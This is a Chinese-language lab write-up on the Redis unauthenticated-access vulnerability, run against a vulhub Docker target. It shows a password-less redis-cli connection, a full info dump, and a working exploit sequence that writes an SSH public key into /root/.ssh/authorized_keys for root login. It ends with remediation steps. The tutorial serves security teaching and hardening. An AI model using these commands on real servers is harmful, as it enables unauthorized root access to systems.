# Redis 未授权访问漏洞
## 漏洞简介
Redis服务若配置对外监听0.0.0.0，并且没有设置访问密码，攻击者可无需认证直接远程连接Redis。可以读取内部数据，还可以利用Redis写文件功能，向服务器写入SSH公钥、WebShell，最终实现服务器权限获取。漏洞端口：6379

## 靶场环境启动

进入漏洞目录：
![进入靶场目录](images/1.png)

执行命令启动靶场
![docker‑compose启动靶场，docker‑ps查看运行容器](images/2.png)

```bash
cd vulhub/redis/4-unacc
docker‑compose up -d
```

## 复现步骤

### 准备连接工具
```bash
yum install -y redis
```
宿主机安装 redis 客户端，提供 redis‑cli 命令用于连接靶场Redis服务
![yum安装redis客户端](images/3.png)
（图片太长，只截图前半段）最后出现Complete安装完成

1. 使用 redis‑cli 客户端直接连接目标，不需要输入密码
```
redis‑cli -h 靶机IP -p 端口

redis‑cli -h 172.18.0.2 -p 6379
```
2. 连接成功后执行 info 命令
```
info
```

···
10.165.15.225:6379> info
# Server
redis_version:4.0.14
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:165c932261a105d7
redis_mode:standalone
os:Linux 3.10.0-1160.el7.x86_64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:8.3.0
process_id:1
run_id:57a726b2ce3b36f187c235b3b5393071104f2d35
tcp_port:6379
uptime_in_seconds:585
uptime_in_days:0
hz:10
lru_clock:9554565
executable:/data/redis-server
config_file:

# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0

# Memory
used_memory:849352
used_memory_human:829.45K
used_memory_rss:7974912
used_memory_rss_human:7.61M
used_memory_peak:849352
used_memory_peak_human:829.45K
used_memory_peak_perc:100.12%
used_memory_overhead:836126
used_memory_startup:786488
used_memory_dataset:13226
used_memory_dataset_perc:21.04%
total_system_memory:3953963008
total_system_memory_human:3.68G
used_memory_lua:37888
used_memory_lua_human:37.00K
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
mem_fragmentation_ratio:9.39
mem_allocator:jemalloc-4.0.3
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1787938876
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:8
total_commands_processed:7
instantaneous_ops_per_sec:0
total_net_input_bytes:2317
total_net_output_bytes:20576
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:6826ddcafe7a0b99bcf43ddb65c0b484f65d1381
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.69
used_cpu_user:0.14
used_cpu_sys_children:0.01
used_cpu_user_children:0.01

# Cluster
cluster_enabled:0

# Keyspace
10.165.15.225:6379> 
···

漏洞现象：没有密码校验，可以看到 redis 版本、操作系统等信息，说明已经成功进入 Redis，存在未授权访问

3. 获取全部 key 数据
```
keys *
```

## 漏洞利用：写入 SSH 公钥提权
```
config set dir /root/.ssh
config set dbfilename "authorized_keys"
set x "\n\nssh‑rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD...\n\n"
save
```
save 执行成功，公钥写入靶机信任文件，可直接 ssh 登录服务器。


## 销毁靶场
```
cd vulhub/redis/4-unacc
docker‑compose down
```


## 修复方案
1. 修改 redis 配置，设置 bind 127.0.0.1，只允许本机访问，禁止 0.0.0.0 对外开放。
2. 设置访问密码 requirepass 自定义强密码，所有客户端连接必须密码认证。
3. 防火墙策略，6379 端口禁止暴露公网，限制可信来源 IP 访问。
4. Redis 使用普通低权限用户启动，禁止 root 账号运行 redis，降低写文件授权风险。
